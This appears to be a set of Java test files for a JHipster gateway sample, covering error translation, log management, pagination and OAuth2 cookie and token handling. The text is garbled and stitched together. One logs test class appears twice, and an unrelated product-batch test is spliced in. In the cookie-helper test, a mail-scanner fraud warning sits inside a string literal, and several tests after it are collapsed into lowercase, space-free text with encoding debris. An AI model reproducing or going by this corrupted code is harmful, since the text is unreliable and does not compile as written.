        public MockHttpServletRequest postProcessRequest(MockHttpServletRequest mockHttpServletRequest) {
            mockHttpServletRequest.addHeader("Authorization", "Bearer " + token);

            return mockHttpServletRequest;
        }
    }
}

 
 
 
 
package com.baeldung.jhipster.gateway.web.rest.errors;

import org.springframework.dao.ConcurrencyFailureException;
import org.springframework.http.HttpStatus;
import org.springframework.security.access.AccessDeniedException;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.web.bind.annotation.*;

import javax.validation.Valid;
import javax.validation.constraints.NotNull;
import java.util.HashMap;
import java.util.Map;

@RestController
public class ExceptionTranslatorTestController {

    @GetMapping("/test/concurrency-failure")
    public void concurrencyFailure() {
        throw new ConcurrencyFailureException("test concurrency failure");
    }

    @PostMapping("/test/method-argument")
    public void methodArgument(@Valid @RequestBody TestDTO testDTO) {
    }

    @GetMapping("/test/parameterized-error")
    public void parameterizedError() {
        throw new CustomParameterizedException("test parameterized error", "param0_value", "param1_value");
    }

    @GetMapping("/test/parameterized-error2")
    public void parameterizedError2() {
        Map<String, Object> params = new HashMap<>();
        params.put("foo", "foo_value");
        params.put("bar", "bar_value");
        throw new CustomParameterizedException("test parameterized error", params);
    }

    @GetMapping("/test/missing-servlet-request-part")
    public void missingServletRequestPartException(@RequestPart String part) {
    }

    @GetMapping("/test/missing-servlet-request-parameter")
    public void missingServletRequestParameterException(@RequestParam String param) {
    }

    @GetMapping("/test/access-denied")
    public void accessdenied() {
        throw new AccessDeniedException("test access denied!");
    }

    @GetMapping("/test/unauthorized")
    public void unauthorized() {
        throw new BadCredentialsException("test authentication failed!");
    }

    @GetMapping("/test/response-status")
    public void exceptionWithReponseStatus() {
        throw new TestResponseStatusException();
    }

    @GetMapping("/test/internal-server-error")
    public void internalServerError() {
        throw new RuntimeException();
    }

    public static class TestDTO {

        @NotNull
        private String test;

        public String getTest() {
            return test;
        }

        public void setTest(String test) {
            this.test = test;
        }
    }

    @ResponseStatus(value = HttpStatus.BAD_REQUEST, reason = "test response status")
    @SuppressWarnings("serial")
    public static class TestResponseStatusException extends RuntimeException {
    }

}

 
 
 
package com.baeldung.jhipster.gateway.web.rest.errors;

import com.baeldung.jhipster.gateway.GatewayApp;
import com.baeldung.jhipster.gateway.config.SecurityBeanOverrideConfiguration;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * Test class for the ExceptionTranslator controller advice.
 *
 * @see ExceptionTranslator
 */
@RunWith(SpringRunner.class)
@SpringBootTest(classes = {SecurityBeanOverrideConfiguration.class, GatewayApp.class})
public class ExceptionTranslatorIntTest {

    @Autowired
    private ExceptionTranslatorTestController controller;

    @Autowired
    private ExceptionTranslator exceptionTranslator;

    @Autowired
    private MappingJackson2HttpMessageConverter jacksonMessageConverter;

    private MockMvc mockMvc;

    @Before
    public void setup() {
        mockMvc = MockMvcBuilders.standaloneSetup(controller)
            .setControllerAdvice(exceptionTranslator)
            .setMessageConverters(jacksonMessageConverter)
            .build();
    }

    @Test
    public void testConcurrencyFailure() throws Exception {
        mockMvc.perform(get("/test/concurrency-failure"))
            .andExpect(status().isConflict())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value(ErrorConstants.ERR_CONCURRENCY_FAILURE));
    }

    @Test
    public void testMethodArgumentNotValid() throws Exception {
         mockMvc.perform(post("/test/method-argument").content("{}").contentType(MediaType.APPLICATION_JSON))
             .andExpect(status().isBadRequest())
             .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
             .andExpect(jsonPath("$.message").value(ErrorConstants.ERR_VALIDATION))
             .andExpect(jsonPath("$.fieldErrors.[0].objectName").value("testDTO"))
             .andExpect(jsonPath("$.fieldErrors.[0].field").value("test"))
             .andExpect(jsonPath("$.fieldErrors.[0].message").value("NotNull"));
    }

    @Test
    public void testParameterizedError() throws Exception {
        mockMvc.perform(get("/test/parameterized-error"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("test parameterized error"))
            .andExpect(jsonPath("$.params.param0").value("param0_value"))
            .andExpect(jsonPath("$.params.param1").value("param1_value"));
    }

    @Test
    public void testParameterizedError2() throws Exception {
        mockMvc.perform(get("/test/parameterized-error2"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("test parameterized error"))
            .andExpect(jsonPath("$.params.foo").value("foo_value"))
            .andExpect(jsonPath("$.params.bar").value("bar_value"));
    }

    @Test
    public void testMissingServletRequestPartException() throws Exception {
        mockMvc.perform(get("/test/missing-servlet-request-part"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.400"));
    }

    @Test
    public void testMissingServletRequestParameterException() throws Exception {
        mockMvc.perform(get("/test/missing-servlet-request-parameter"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.400"));
    }

    @Test
    public void testAccessDenied() throws Exception {
        mockMvc.perform(get("/test/access-denied"))
            .andExpect(status().isForbidden())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.403"))
            .andExpect(jsonPath("$.detail").value("test access denied!"));
    }

    @Test
    public void testUnauthorized() throws Exception {
        mockMvc.perform(get("/test/unauthorized"))
            .andExpect(status().isUnauthorized())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.401"))
            .andExpect(jsonPath("$.path").value("/test/unauthorized"))
            .andExpect(jsonPath("$.detail").value("test authentication failed!"));
    }

    @Test
    public void testMethodNotSupported() throws Exception {
        mockMvc.perform(post("/test/access-denied"))
            .andExpect(status().isMethodNotAllowed())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.405"))
            .andExpect(jsonPath("$.detail").value("Request method 'POST' not supported"));
    }

    @Test
    public void testExceptionWithResponseStatus() throws Exception {
        mockMvc.perform(get("/test/response-status"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.400"))
            .andExpect(jsonPath("$.title").value("test response status"));
    }

    @Test
    public void testInternalServerError() throws Exception {
        mockMvc.perform(get("/test/internal-server-error"))
            .andExpect(status().isInternalServerError())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.500"))
            .andExpect(jsonPath("$.title").value("Internal Server Error"));
    }

}

 
 
 
package com.baeldung.jhipster.gateway.web.rest;

import com.baeldung.jhipster.gateway.GatewayApp;
import com.baeldung.jhipster.gateway.config.SecurityBeanOverrideConfiguration;
import com.baeldung.jhipster.gateway.web.rest.vm.LoggerVM;
import ch.qos.logback.classic.AsyncAppender;
import ch.qos.logback.classic.LoggerContext;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.slf4j.LoggerFactory;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.put;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * Test class for the LogsResource REST controller.
 *
 * @see LogsResource
 */
@RunWith(SpringRunner.class)
@SpringBootTest(classes = {SecurityBeanOverrideConfiguration.class, GatewayApp.class})
public class LogsResourceIntTest {

    private MockMvc restLogsMockMvc;

    @Before
    public void setup() {
        LogsResource logsResource = new LogsResource();
        this.restLogsMockMvc = MockMvcBuilders
            .standaloneSetup(logsResource)
            .build();
    }

    @Test
    public void getAllLogs() throws Exception {
        restLogsMockMvc.perform(get("/management/logs"))
            .andExpect(status().isOk())
            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE));
    }

    @Test
    public void changeLogs() throws Exception {
        LoggerVM logger = new LoggerVM();
        logger.setLevel("INFO");
        logger.setName("ROOT");

        restLogsMockMvc.perform(put("/management/logs")
            .contentType(TestUtil.APPLICATION_JSON_UTF8)
            .content(TestUtil.convertObjectToJsonBytes(logger)))
            .andExpect(status().isNoContent());
    }

    @Test
    public void testLogstashAppender() {
        LoggerContext context = (LoggerContext) LoggerFactory.getILoggerFactory();
        assertThat(context.getLogger("ROOT").getAppender("ASYNC_LOGSTASH")).isInstanceOf(AsyncAppender.class);
    }
}

 
 
package com.baeldung.jhipster.gateway.web.rest;

import com.baeldung.jhipster.gateway.GatewayApp;
import com.baeldung.jhipster.gateway.config.SecurityBeanOverrideConfiguration;
import com.baeldung.jhipster.gateway.web.rest.vm.LoggerVM;
import ch.qos.logback.classic.AsyncAppender;
import ch.qos.logback.classic.LoggerContext;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.slf4j.LoggerFactory;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.put;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * Test class for the LogsResource REST controller.
 *
 * @see LogsResource
 */
@RunWith(SpringRunner.class)
@SpringBootTest(classes = {SecurityBeanOverrideConfiguration.class, GatewayApp.class})
public class LogsResourceIntTest {

    private MockMvc restLogsMockMvc;

    @Before
    public void setup() {
        LogsResource logsResource = new LogsResource();
        this.restLogsMockMvc = MockMvcBuilders
            .standaloneSetup(logsResource)
            .build();
    }

    @Test
    public void getAllLogs() throws Exception {
        restLogsMockMvc.perform(get("/management/logs"))
            .andExpect(status().isOk())
            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE));
    }

    @Test
    public void changeLogs() throws Exception {
        LoggerVM logger = new LoggerVM();
        logger.setLevel("INFO");
        logger.setName("ROOT");

        restLogsMockMvc.perform(put("/management/logs")
            .contentType(TestUtil.APPLICATION_JSON_UTF8)
            .content(TestUtil.convertObjectToJsonBytes(logger)))
            .andExpect(status().isNoContent());
    }

    @Test
    public void testLogstashAppender() {
        LoggerContext context = (LoggerContext) LoggerFactory.getILoggerFactory();
        assertThat(context.getLogger("ROOT").getAppender("ASYNC_LOGSTASH")).isInstanceOf(AsyncAppender.class);
    }
}

 
 
package com.baeldung.jhipster.gateway.web.rest;

import com.fasterxml.jackson.annotation.JsonInclude;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;
import org.hamcrest.Description;
import org.hamcrest.TypeSafeDiagnosingMatcher;
import org.springframework.format.datetime.standard.DateTimeFormatterRegistrar;
import org.springframework.format.support.DefaultFormattingConversionService;
import org.springframework.format.support.FormattingConversionService;
import org.springframework.http.MediaType;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.time.ZonedDateTime;
import java.time.format.DateTimeParseException;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Utility class for testing REST controllers.
 */
public class TestUtil {

    /** MediaType for JSON UTF8 */
    public static final MediaType APPLICATION_JSON_UTF8 = new MediaType(
            MediaType.APPLICATION_JSON.getType(),
            MediaType.APPLICATION_JSON.getSubtype(), StandardCharsets.UTF_8);

    /**
     * Convert an object to JSON byte array.
     *
     * @param object
     *            the object to convert
     * @return the JSON byte array
     * @throws IOException
     */
    public static byte[] convertObjectToJsonBytes(Object object)
            throws IOException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.setSerializationInclusion(JsonInclude.Include.NON_EMPTY);

        JavaTimeModule module = new JavaTimeModule();
        mapper.registerModule(module);

        return mapper.writeValueAsBytes(object);
    }

    /**
     * Create a byte array with a specific size filled with specified data.
     *
     * @param size the size of the byte array
     * @param data the data to put in the byte array
     * @return the JSON byte array
     */
    public static byte[] createByteArray(int size, String data) {
        byte[] byteArray = new byte[size];
        for (int i = 0; i < size; i++) {
            byteArray[i] = Byte.parseByte(data, 2);
        }
        return byteArray;
    }

    /**
     * A matcher that tests that the examined string represents the same instant as the reference datetime.
     */
    public static class ZonedDateTimeMatcher extends TypeSafeDiagnosingMatcher<String> {

        private final ZonedDateTime date;

        public ZonedDateTimeMatcher(ZonedDateTime date) {
            this.date = date;
        }

        @Override
        protected boolean matchesSafely(String item, Description mismatchDescription) {
            try {
                if (!date.isEqual(ZonedDateTime.parse(item))) {
                    mismatchDescription.appendText("was ").appendValue(item);
                    return false;
                }
                return true;
            } catch (DateTimeParseException e) {
                mismatchDescription.appendText("was ").appendValue(item)
                    .appendText(", which could not be parsed as a ZonedDateTime");
                return false;
            }

        }

        @Override
        public void describeTo(Description description) {
            description.appendText("a String representing the same Instant as ").appendValue(date);
        }
    }

    /**
     * Creates a matcher that matches when the examined string reprensents the same instant as the reference datetime
     * @param date the reference datetime against which the examined string is checked
     */
    public static ZonedDateTimeMatcher sameInstant(ZonedDateTime date) {
        return new ZonedDateTimeMatcher(date);
    }

    /**
     * Verifies the equals/hashcode contract on the domain object.
     */
    public static <T> void equalsVerifier(Class<T> clazz) throws Exception {
        T domainObject1 = clazz.getConstructor().newInstance();
        assertThat(domainObject1.toString()).isNotNull();
        assertThat(domainObject1).isEqualTo(domainObject1);
        assertThat(domainObject1.hashCode()).isEqualTo(domainObject1.hashCode());
        // Test with an instance of another class
        Object testOtherObject = new Object();
        assertThat(domainObject1).isNotEqualTo(testOtherObject);
        assertThat(domainObject1).isNotEqualTo(null);
        // Test with an instance of the same class
        T domainObject2 = clazz.getConstructor().newInstance();
        assertThat(domainObject1).isNotEqualTo(domainObject2);
        // HashCodes are equals because the objects are not persisted yet
        assertThat(domainObject1.hashCode()).isEqualTo(domainObject2.hashCode());
    }

    /**
     * Create a FormattingConversionService which use ISO date format, instead of the localized one.
     * @return the FormattingConversionService
     */
    public static FormattingConversionService createFormattingConversionService() {
        DefaultFormattingConversionService dfcs = new DefaultFormattingConversionService ();
        DateTimeFormatterRegistrar registrar = new DateTimeFormatterRegistrar();
        registrar.setUseIsoFormat(true);
        registrar.registerFormatters(dfcs);
        return dfcs;
    }
}

 
 
package com.baeldung.jhipster.gateway.web.rest.util;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;

import java.util.ArrayList;
import java.util.List;

import org.junit.Test;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.PageImpl;
import org.springframework.data.domain.PageRequest;
import org.springframework.http.HttpHeaders;

/**
 * Tests based on parsing algorithm in app/components/util/pagination-util.service.js
 *
 * @see PaginationUtil
 */
public class PaginationUtilUnitTest {

    @Test
    public void generatePaginationHttpHeadersTest() {
        String baseUrl = "/api/_search/example";
        List<String> content = new ArrayList<>();
        Page<String> page = new PageImpl<>(content, PageRequest.of(6, 50), 400L);
        HttpHeaders headers = PaginationUtil.generatePaginationHttpHeaders(page, baseUrl);
        List<String> strHeaders = headers.get(HttpHeaders.LINK);
        assertNotNull(strHeaders);
        assertTrue(strHeaders.size() == 1);
        String headerData = strHeaders.get(0);
        assertTrue(headerData.split(",").length == 4);
        String expectedData = "</api/_search/example?page=7&size=50>; rel=\"next\","
                + "</api/_search/example?page=5&size=50>; rel=\"prev\","
                + "</api/_search/example?page=7&size=50>; rel=\"last\","
                + "</api/_search/example?page=0&size=50>; rel=\"first\"";
        assertEquals(expectedData, headerData);
        List<String> xTotalCountHeaders = headers.get("X-Total-Count");
        assertTrue(xTotalCountHeaders.size() == 1);
        assertTrue(Long.valueOf(xTotalCountHeaders.get(0)).equals(400L));
    }

}

 
package com.baeldung.jhipster.gateway.security.oauth2;

import com.baeldung.jhipster.gateway.config.oauth2.OAuth2Properties;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.test.util.ReflectionTestUtils;

/**
 * Tests helper functions around OAuth2 Cookies.
 *
 * @see OAuth2CookieHelper
 */
public class OAuth2CookieHelperTest {
    public static final String GET_COOKIE_DOMAIN_METHOD = "getCookieDomain";
    private OAuth2Properties oAuth2Properties;
    private OAuth2CookieHelper cookieHelper;

    @Before
    public void setUp() throws NoSuchMethodException {
        oAuth2Properties = new OAuth2Properties();
        cookieHelper = new OAuth2CookieHelper(oAuth2Properties);
    }

    @Test
    public void testLocalhostDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("localhost");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);
    }

    @Test
    public void testComDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("test.com");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);        //already top-level domain
    }

    @Test
    public void testWwwDomainCom() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("MailScanner has detected a possible fraud attempt from "www.test.com");ÂÂÂÂÂÂÂstringname=reflectiontestutils.invokemethod(cookiehelper,get_cookie_domain_method,request);ÂÂÂÂÂÂÂassert.assertnull(name);ÂÂÂ}ÂÂÂ@testÂÂÂpublicvoidtestcomsubdomain(){ÂÂÂÂÂÂÂmockhttpservletrequestrequest=newmockhttpservletrequest();ÂÂÂÂÂÂÂrequest.setservername("abc.test.com");ÂÂÂÂÂÂÂstringname=reflectiontestutils.invokemethod(cookiehelper,get_cookie_domain_method,request);ÂÂÂÂÂÂÂassert.assertequals(".test.com",name);ÂÂÂ}ÂÂÂ@testÂÂÂpublicvoidtestwwwsubdomaincom(){ÂÂÂÂÂÂÂmockhttpservletrequestrequest=newmockhttpservletrequest();ÂÂÂÂÂÂÂrequest.setservername("www.abc.test.com");ÂÂÂÂÂÂÂstringname=reflectiontestutils.invokemethod(cookiehelper,get_cookie_domain_method,request);ÂÂÂÂÂÂÂassert.assertequals(".test.com",name);ÂÂÂ}ÂÂÂ@testÂÂÂpublicvoidtestcoukdomain(){ÂÂÂÂÂÂÂmockhttpservletrequestrequest=newmockhttpservletrequest();ÂÂÂÂÂÂÂrequest.setservername("test.co.uk");ÂÂÂÂÂÂÂstringname=reflectiontestutils.invokemethod(cookiehelper,get_cookie_domain_method,request);ÂÂÂÂÂÂÂassert.assertnull(name);ÂÂÂÂÂÂÂÂÂÂÂ" claiming to be www.test.com");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);
    }

    @Test
    public void testComSubDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("abc.test.com");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertEquals(".test.com", name);
    }

    @Test
    public void testWwwSubDomainCom() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("www.abc.test.com");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertEquals(".test.com", name);
    }


    @Test
    public void testCoUkDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("test.co.uk");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);            //already top-level domain
    }

    @Test
    public void testCoUkSubDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("abc.test.co.uk");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertEquals(".test.co.uk", name);
    }

    @Test
    public void testNestedDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("abc.xyu.test.co.uk");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertEquals(".test.co.uk", name);
    }

    @Test
    public void testIpAddress() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("127.0.0.1");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);
    }
}


	@Test
    public void test_send_ProductsBatchRequest_Operation() throws Exception {
        final ProductsBatchController productsBatchController = mock(ProductsBatchController.class);
        final String expectedBatchDescriptorAsJson =
                "{\n" +
                        "  \"reportId\": \"123\",\n" +
                        "  \"locale\": \"de_DE\",\n" +
                        "  \"kind\": \"PRODUCTS_BATCH\",\n" +
                        "  \"mode\": \"DRY_RUN\"\n" +
                        "}";

        final List<Request> addRequestList = this.buildAddRequest(5);
        final List<Request> deleteRequestList = this.buildDeleteRequest(0);
        final List<Request> updateRequestList = this.buildUpdateRequest(4);
        final List<Request> allRequests = buildRequest(addRequestList, deleteRequestList, updateRequestList);

        final BatchRequestExt request = new BatchRequestExt(
                DEFAULT_LOCALE,
                BatchKind.PRODUCTS_BATCH,
                BatchMode.DRY_RUN,
                allRequests,
                DEFAULT_REPORT_ID);

        final BatchDescriptor expected = this.getBatchDescriptor(expectedBatchDescriptorAsJson);
        final URI uri = this.buildURI("https://localhost:8093", "/google-shopping/products/batches");
        final RequestEntity<BatchRequestExt> requestEntity = new RequestEntity<>(request, HttpMethod.POST, uri);

        final MultiValueMap<String, String> headers = new LinkedMultiValueMap<>();
        headers.add(HttpHeaders.CONTENT_TYPE, MediaType.APPLICATION_JSON_VALUE);

        when(productsBatchController.start(any(BatchRequestExt.class))).thenReturn(expected);
        when(this.restTemplate.exchange(requestEntity, BatchDescriptor.class)).thenReturn(new ResponseEntity(expected, headers, HttpStatus.OK));

        final ResponseEntity<BatchDescriptor> response = this.restTemplate.exchange(requestEntity, BatchDescriptor.class);
        assertThat(response, is(not(nullValue())));

        final BatchDescriptor descriptor = response.getBody();
        assertThat(descriptor, is(not(nullValue())));
        assertThat(descriptor.getLocale(), IsEqual.equalTo(DEFAULT_LOCALE));
        assertThat(descriptor.getKind(), IsEqual.equalTo(BatchKind.PRODUCTS_BATCH));
        assertThat(descriptor.getMode(), IsEqual.equalTo(BatchMode.DRY_RUN));
        assertThat(descriptor.getReportId(), IsEqual.equalTo(DEFAULT_REPORT_ID));
        assertThat(descriptor.getStart(), is(nullValue()));
        assertThat(descriptor.getFinish(), is(nullValue()));

        final HttpHeaders responseHeaders = response.getHeaders();
        assertThat(responseHeaders, is(not(nullValue())));
        assertThat(responseHeaders.getContentType(), IsEqual.equalTo(MediaType.APPLICATION_JSON_UTF8));

        verify(productsBatchController).start(ArgumentMatchers.eq(request));
        verify(productsBatchController, only()).start(request);
        verify(productsBatchController).start(this.batchRequestExtArgumentCaptor.capture());

        final BatchRequestExt capturedArgument = this.batchRequestExtArgumentCaptor.getValue();
        assertThat(capturedArgument, is(not(nullValue())));
        assertThat(capturedArgument, IsEqual.equalTo(requestEntity));

        verifyNoMoreInteractions(productsBatchController);
    }

 
 
package com.baeldung.jhipster.gateway.security.oauth2;

import com.baeldung.jhipster.gateway.config.oauth2.OAuth2Properties;
import com.baeldung.jhipster.gateway.web.filter.RefreshTokenFilter;
import com.baeldung.jhipster.gateway.web.rest.errors.InvalidPasswordException;
import io.github.jhipster.config.JHipsterProperties;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.ExpectedException;
import org.junit.runner.RunWith;
import org.mockito.Mock;
import org.mockito.junit.MockitoJUnitRunner;
import org.springframework.http.*;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;
import org.springframework.security.oauth2.common.DefaultOAuth2AccessToken;
import org.springframework.security.oauth2.common.DefaultOAuth2RefreshToken;
import org.springframework.security.oauth2.common.OAuth2AccessToken;
import org.springframework.security.oauth2.common.exceptions.InvalidTokenException;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.RestTemplate;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import static org.mockito.Mockito.when;

/**
 * Test password and refresh token grants.
 *
 * @see OAuth2AuthenticationService
 */
@RunWith(MockitoJUnitRunner.class)
public class OAuth2AuthenticationServiceTest {
    public static final String CLIENT_AUTHORIZATION = "Basic d2ViX2FwcDpjaGFuZ2VpdA==";
    public static final String ACCESS_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE0OTQyNzI4NDQsInVzZXJfbmFtZSI6InVzZXIiLCJhdXRob3JpdGllcyI6WyJST0xFX1VTRVIiXSwianRpIjoiNzc1ZTJkYWUtYWYzZi00YTdhLWExOTktNzNiZTU1MmIxZDVkIiwiY2xpZW50X2lkIjoid2ViX2FwcCIsInNjb3BlIjpbIm9wZW5pZCJdfQ.gEK0YcX2IpkpxnkxXXHQ4I0xzTjcy7edqb89ukYE0LPe7xUcZVwkkCJF_nBxsGJh2jtA6NzNLfY5zuL6nP7uoAq3fmvsyrcyR2qPk8JuuNzGtSkICx3kPDRjAT4ST8SZdeh7XCbPVbySJ7ZmPlRWHyedzLA1wXN0NUf8yZYS4ELdUwVBYIXSjkNoKqfWm88cwuNr0g0teypjPtjDqCnXFt1pibwdfIXn479Y1neNAdvSpHcI4Ost-c7APCNxW2gqX-0BItZQearxRgKDdBQ7CGPAIky7dA0gPuKUpp_VCoqowKCXqkE9yKtRQGIISewtj2UkDRZePmzmYrUBXRzfYw";
    public static final String REFRESH_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJ1c2VyIiwic2NvcGUiOlsib3BlbmlkIl0sImF0aSI6Ijc3NWUyZGFlLWFmM2YtNGE3YS1hMTk5LTczYmU1NTJiMWQ1ZCIsImV4cCI6MTQ5Njg2NDc0MywiYXV0aG9yaXRpZXMiOlsiUk9MRV9VU0VSIl0sImp0aSI6IjhmYjI2YTllLTdjYzQtNDFlMi1hNzBjLTk4MDc0N2U2YWFiOSIsImNsaWVudF9pZCI6IndlYl9hcHAifQ.q1-Df9_AFO6TJNiLKV2YwTjRbnd7qcXv52skXYnog5siHYRoR6cPtm6TNQ04iDAoIHljTSTNnD6DS3bHk41mV55gsSVxGReL8VCb_R8ZmhVL4-5yr90sfms0wFp6lgD2bPmZ-TXiS2Oe9wcbNWagy5RsEplZ-sbXu3tjmDao4FN35ojPsXmUs84XnNQH3Y_-PY9GjZG0JEfLQIvE0J5BkXS18Z015GKyA6GBIoLhAGBQQYyG9m10ld_a9fD5SmCyCF72Jad_pfP1u8Z_WyvO-wrlBvm2x-zBthreVrXU5mOb9795wJEP-xaw3dXYGjht_grcW4vKUFtj61JgZk98CQ";
    public static final String EXPIRED_SESSION_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJ1c2VyIiwic2NvcGUiOlsib3BlbmlkIl0sImF0aSI6IjE0NTkwYzdkLTQ5M2YtNDU0NS05MzlmLTg1ODM4ZjRmNzNmNSIsImV4cCI6MTQ5NTU3Mjg5MywiaWF0IjoxNDk1MzIwODkzLCJhdXRob3JpdGllcyI6WyJST0xFX1VTRVIiXSwianRpIjoiNzVhYTIxNzEtMzFmNi00MWJmLWExZGUtYWU0YTg1ZjZiMjEyIiwiY2xpZW50X2lkIjoid2ViX2FwcCJ9.gAH-yly7WAslQUeGhyHmjYXwQN3dluvoT84iOJ2mVWYGVlnDRsoxN3_d1ozqtiso9UM7dWpAr80o3gK7AyK-cO1GGBXa3lg0ETsbucFoqHLivgGZA2qVOsFlDq8E7DZENAbOWmywmhFUOogCfZ-BqsuFSi8waMLL-1qlhehBPuK1KzGxIZbjSVUFFFYTxoWPKi2NNTBzYSwwCV0ixj-gHyFC6Gl5ByA4EvYygGUZF2pACxs4tIRkmT90pXWCjWeKS9k9MlxZ7C4UHqyTRW-IYzqAm8OHdwsnXeu0GkFYc08gxoUuPcjMby8ziYLG5uWj0Ua0msmiSjoafzs-5xfH-Q";
